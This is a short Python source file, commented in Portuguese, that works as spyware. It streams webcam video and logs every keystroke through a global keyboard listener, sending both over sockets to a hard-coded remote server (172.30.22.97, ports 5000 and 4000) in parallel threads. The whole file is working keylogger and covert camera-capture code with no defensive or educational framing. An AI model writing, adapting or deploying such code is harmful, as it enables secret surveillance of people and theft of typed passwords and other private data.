import socket
import cv2
import time
import threading
from pynput import keyboard

SERVER_IP = "172.30.22.97"
VIDEO_PORT = 5000
KEYLOG_PORT = 4000

# Função para capturar e enviar vídeo
def capturar_e_enviar_video():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client_socket.connect((SERVER_IP, VIDEO_PORT))
        print(f"[VÍDEO] Conectado ao servidor {SERVER_IP}:{VIDEO_PORT}")

        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            print("[VÍDEO] Erro ao acessar a câmera.")
            return

        while cap.isOpened():
            ret, frame = cap.read()
            if not ret:
                break

            _, buffer = cv2.imencode('.jpg', frame)
            frame_bytes = buffer.tobytes()

            frame_size = len(frame_bytes)
            client_socket.sendall(frame_size.to_bytes(4, 'big'))  # Envia tamanho do frame
            client_socket.sendall(frame_bytes)  # Envia frame

            time.sleep(0.03)  # Aproximadamente 30 FPS

    except Exception as e:
        print(f"[VÍDEO] Erro ao capturar ou enviar vídeo: {e}")
    finally:
        cap.release()
        client_socket.close()
        print("[VÍDEO] Conexão fechada.")

# Função para capturar e enviar teclas pressionadas
def capturar_e_enviar_teclado():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client_socket.connect((SERVER_IP, KEYLOG_PORT))
        print(f"[KEYLOG] Conectado ao servidor {SERVER_IP}:{KEYLOG_PORT}")

        def on_press(key):
            try:
                # Captura teclas normais
                key_data = key.char
            except AttributeError:
                # Captura teclas especiais (Shift, Ctrl, etc.)
                key_data = f"[{key.name}]"

            print(f"[KEYLOG] Tecla pressionada: {key_data}")  # Log no console
            client_socket.sendall((key_data + "\n").encode('utf-8'))  # Envia para o servidor

        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()  # Mantém o listener rodando

    except Exception as e:
        print(f"[KEYLOG] Erro ao capturar ou enviar teclas: {e}")
    finally:
        client_socket.close()
        print("[KEYLOG] Conexão fechada.")

# Criando threads para enviar vídeo e teclado simultaneamente
video_thread = threading.Thread(target=capturar_e_enviar_video, daemon=True)
keylog_thread = threading.Thread(target=capturar_e_enviar_teclado, daemon=True)
video_thread.start()
keylog_thread.start()

video_thread.join()
keylog_thread.join()
